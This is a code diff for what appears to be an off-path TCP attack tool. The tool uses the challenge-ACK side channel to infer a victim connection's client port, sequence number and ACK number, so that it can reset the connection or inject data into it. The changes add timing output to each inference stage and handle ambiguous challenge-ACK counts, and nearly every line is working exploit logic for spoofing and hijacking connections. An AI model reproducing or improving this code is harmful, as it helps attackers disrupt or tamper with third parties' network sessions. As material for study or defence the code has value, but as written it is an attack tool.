@@ -107,11 +107,11 @@ typedef struct thctx_struct {
 	/* other options */
 	uint16_t winsz; // initial TCP window size
 	int autostart;
-	// inject or reset?
 	u_long packets_per_second;
 	u_long packet_delay;
 	u_long start_seq;
 	u_long start_ack;
+	/* inject? */
 	char *inject_server;
 	off_t inject_server_len;
 	char *inject_client;
@@ -683,9 +683,12 @@ int sync_time_with_remote(void)
 {
 	int attempts = 0, round = 0, chack_cnt[4] = { 0 };
 	struct timeval round_start, start, now;
+	struct timeval sync_start;
 #ifdef DEBUG_SYNC_SEND_TIME
 	struct timeval diff;
 #endif
+
+	gettimeofday(&sync_start, NULL);
 
 	/* if we don't synchronize within 3 attempts, give up.. */
 	while (1) {
@@ -723,7 +726,9 @@ int sync_time_with_remote(void)
 		if (chack_cnt[round] == 100) {
 			if (round == 3) {
 				/* verified! */
-				printf("[*] Time synchronization complete!\n");
+				gettimeofday(&now, NULL);
+				timersub(&now, &sync_start, &start);
+				printf("[*] Time synchronization complete (after %lu %lu)\n", start.tv_sec, start.tv_usec);
 				return 1;
 			}
 			/* we got lucky! verify... */
@@ -852,10 +857,7 @@ chunk_t *build_schedule_reverse(u_long start, u_long end, u_long chunk_sz, int *
  */
 int infer_four_tuple(void)
 {
-	struct timeval round_start;
-#ifdef DEBUG_TUPLE_INFER_SPOOF_SEND
-	struct timeval now, diff;
-#endif
+	struct timeval infer_start, round_start, now, diff;
 	volatile conn_t *spoof = &(g_ctx.spoof);
 	int test_mode = -1;
 	/* chunk-based search vars */
@@ -863,6 +865,8 @@ int infer_four_tuple(void)
 	int nchunks = 0, ci = 0;
 	/* binary search vars */
 	u_long bs_start = 0, bs_end = 0, bs_mid = 0;
+
+	gettimeofday(&infer_start, NULL);
 
 	while (1) {
 		gettimeofday(&round_start, NULL);
@@ -998,14 +1002,20 @@ int infer_four_tuple(void)
 
 			if (test_mode == 0) {
 				/* correct! */
-				printf("[*] Confirmed client port (from hint): %lu\n", bs_start);
+				gettimeofday(&now, NULL);
+				timersub(&now, &infer_start, &diff);
+				printf("[*] Confirmed client port (from hint): %lu (after %lu %lu)\n",
+						bs_start, diff.tv_sec, diff.tv_usec);
 				spoof->src.sin_port = ntohs(bs_start);
 				return 1;
 			} else if (test_mode == 1) {
 				/* proceed to a binary search of this block */
 				/* if there was only one port tested, it must be it! */
 				if (bs_end - bs_start <= 1) {
-					printf("[*] Confirmed client port (via chunk): %lu\n", bs_start);
+					gettimeofday(&now, NULL);
+					timersub(&now, &infer_start, &diff);
+					printf("[*] Confirmed client port (via chunk): %lu (after %lu %lu)\n",
+							bs_start, diff.tv_sec, diff.tv_usec);
 					spoof->src.sin_port = ntohs(bs_start);
 					return 1;
 				}
@@ -1013,7 +1023,10 @@ int infer_four_tuple(void)
 			} else if (test_mode == 2) {
 				if (bs_end - bs_mid == 1) {
 					/* we legitimately guessed it via binary search! */
-					printf("[*] Guessed client port (via binary search): %lu\n", bs_mid);
+					gettimeofday(&now, NULL);
+					timersub(&now, &infer_start, &diff);
+					printf("[*] Guessed client port (via binary search): %lu (after %lu %lu)\n",
+							bs_mid, diff.tv_sec, diff.tv_usec);
 					spoof->src.sin_port = ntohs(bs_mid);
 					return 1;
 				}
@@ -1050,13 +1063,15 @@ int infer_four_tuple(void)
  */
 int infer_sequence_step1(u_long *pstart, u_long *pend)
 {
-	struct timeval round_start;
+	struct timeval infer_start, round_start, now, diff;
 	volatile conn_t *spoof = &(g_ctx.spoof);
 	/* printing status */
 	u_long pr_start, pr_end, pkts_sent;
 	/* chunk-based search vars */
 	chunk_t *sched = NULL;
 	int nchunks = 0, ci = 0;
+
+	gettimeofday(&infer_start, NULL);
 
 	/* allocate a schedule for testing sequence blocks
 	 * NOTE: the values in the schedule are actually block numbers
@@ -1120,8 +1135,11 @@ int infer_sequence_step1(u_long *pstart, u_long *pend)
 			*pstart = pr_start;
 			*pend = pr_end + g_ctx.winsz;
 
-			printf("[*] Narrowed sequence (1) to %lu - %lu (%lu possibilities)\n",
-					*pstart, *pend, *pend - *pstart);
+			gettimeofday(&now, NULL);
+			timersub(&now, &infer_start, &diff);
+			printf("[*] Narrowed sequence (1) to %lu - %lu, %lu possibilities (after %lu %lu)\n",
+					*pstart, *pend, *pend - *pstart, diff.tv_sec,
+					diff.tv_usec);
 
 			/* adjust winsz if g_chack_cnt < 99 */
 			if (g_chack_cnt < 99) {
@@ -1155,13 +1173,15 @@ int infer_sequence_step1(u_long *pstart, u_long *pend)
 
 int infer_sequence_step2(u_long *pstart, u_long *pend)
 {
-	struct timeval round_start;
+	struct timeval infer_start, round_start, now, diff;
 	volatile conn_t *spoof = &(g_ctx.spoof);
 	/* printing status */
 	u_long pr_start, pr_end, pkts_sent;
 	/* binary search vars */
 	u_long bs_start, bs_end, bs_mid = 0;
 	u_long seq_block;
+
+	gettimeofday(&infer_start, NULL);
 
 	bs_start = *pstart / g_ctx.winsz;
 	bs_end = *pend / g_ctx.winsz;
@@ -1224,7 +1244,10 @@ int infer_sequence_step2(u_long *pstart, u_long *pend)
 				/* if we want to inject, we go to stage 3 directly */
 				if (g_ctx.inject_server || g_ctx.inject_client) {
 					/* return so the caller will work towards injection */
-					printf("[*] Found in-window sequence number: %lu\n", seq_block);
+					gettimeofday(&now, NULL);
+					timersub(&now, &infer_start, &diff);
+					printf("[*] Found in-window sequence number: %lu (after %lu %lu)\n",
+							seq_block, diff.tv_sec, diff.tv_usec);
 					g_ctx.spoof.seq = seq_block;
 					g_chack_cnt = 0;
 					return 1;
@@ -1232,9 +1255,13 @@ int infer_sequence_step2(u_long *pstart, u_long *pend)
 					*pstart = seq_block - g_ctx.winsz;
 					*pend = seq_block + g_ctx.winsz;
 
-					/* continue with step2 -- try to reset the connection */
-					printf("[*] Narrowed sequence (2) to: %lu - %lu (%lu possibilities)\n",
-							*pstart, *pend, (u_long)g_ctx.winsz * 2);
+					/* return so the caller will work towards resetting the
+					 * connection */
+					gettimeofday(&now, NULL);
+					timersub(&now, &infer_start, &diff);
+					printf("[*] Narrowed sequence (2) to: %lu - %lu, %lu possibilities (after %lu %lu)\n",
+							*pstart, *pend, (u_long)g_ctx.winsz * 2,
+							diff.tv_sec, diff.tv_usec);
 					return 1;
 				}
 			}
@@ -1253,7 +1280,7 @@ int infer_sequence_step2(u_long *pstart, u_long *pend)
 
 int infer_sequence_step3(u_long *pstart, u_long *pend, int use_data)
 {
-	struct timeval round_start;
+	struct timeval infer_start, round_start, now, diff;
 	volatile conn_t *spoof = &(g_ctx.spoof);
 	/* printing status */
 	u_long pr_start, pr_end, pkts_sent;
@@ -1262,6 +1289,8 @@ int infer_sequence_step3(u_long *pstart, u_long *pend, int use_data)
 	int nchunks = 0, ci = 0;
 	u_long seq_guess;
 	int saw_lt_100 = 0;
+
+	gettimeofday(&infer_start, NULL);
 
 	/* build a schedule working from right to left */
 	sched = build_schedule_reverse(*pstart, *pend, g_ctx.packets_per_second,
@@ -1313,8 +1342,17 @@ int infer_sequence_step3(u_long *pstart, u_long *pend, int use_data)
 		if (g_chack_cnt == 100) {
 			/* if we ever saw < 100 before this, then this means we're done. */
 			if (saw_lt_100) {
-				if (!g_ctx.inject_server && !g_ctx.inject_client)
-					printf("[*] finished! connection should be reset now!\n");
+				gettimeofday(&now, NULL);
+				timersub(&now, &infer_start, &diff);
+				if (!g_ctx.inject_server && !g_ctx.inject_client) {
+					printf("[*] Finished! Connection should be reset now! (after %lu %lu)\n",
+							diff.tv_sec, diff.tv_usec);
+					// XXX: TODO: verify that it is reset?
+				} else {
+					printf("[*] Final sequence: %lu and ack: %lu (after %lu %lu)\n",
+							(u_long)g_ctx.spoof.seq, (u_long)g_ctx.spoof.ack,
+							diff.tv_sec, diff.tv_usec);
+				}
 				g_chack_cnt = 0;
 				return 1;
 			}
@@ -1376,7 +1414,7 @@ int infer_sequence_number(void)
  */
 int infer_ack_number(void)
 {
-	struct timeval round_start;
+	struct timeval infer_start, round_start, now, diff;
 	volatile conn_t *spoof = &(g_ctx.spoof);
 	int step = 0;
 	/* printing status */
@@ -1386,6 +1424,10 @@ int infer_ack_number(void)
 	u_long g_acks[4] = { 0, 0x40000000, 0x80000000, 0xc0000000 };
 	int g_chacks[4] = { 0 };
 	int ai = 0;
+	int last_chack_cnt = 0;
+	int found = 0;
+
+	gettimeofday(&infer_start, NULL);
 
 	while (1) {
 		gettimeofday(&round_start, NULL);
@@ -1490,22 +1532,37 @@ int infer_ack_number(void)
 				}
 			} else if (g_chack_cnt == 100) {
 				/* if our window is 1, we win! */
-				if (bs_mid == bs_end - 1) {
-					/* continue with step2 -- try to reset the connection */
-					bs_mid -= g_acks[2] - 1;
-					printf("[*] Determined approx. ACK value: %lu\n", bs_mid);
-					spoof->ack = bs_mid;
-					return 1;
-				}
+				if (bs_mid == bs_end - 1)
+					found = 1;
 				else
 					/* adjust range */
 					bs_start = bs_mid;
+			} else if (g_chack_cnt == 99) {
+				/* this could mean we found the boundary, or maybe packet loss */
+				if (last_chack_cnt == 99)
+					found = 1;
+				else
+					fprintf(stderr, "[!] suspicious challenge ACK count! retrying...\n");
 			} else {
 				fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
+			}
+
+			if (found) {
+				u_long ack = (bs_mid - (g_acks[2] - 1)) & 0xffffffff;
+
+				/* continue with step2 -- try to reset the connection */
+				gettimeofday(&now, NULL);
+				timersub(&now, &infer_start, &diff);
+				printf("[*] Determined approx. ACK value (1): %lu, start_ack: %lu (after %lu %lu)\n", ack, bs_mid,
+						diff.tv_sec, diff.tv_usec);
+				spoof->ack = ack;
+				g_chack_cnt = 0;
+				return 1;
 			}
 		}
 
 		// XXX: TODO: scale number of guesses per round based on feedback
+		last_chack_cnt = g_chack_cnt;
 		g_chack_cnt = 0;
 	}
 
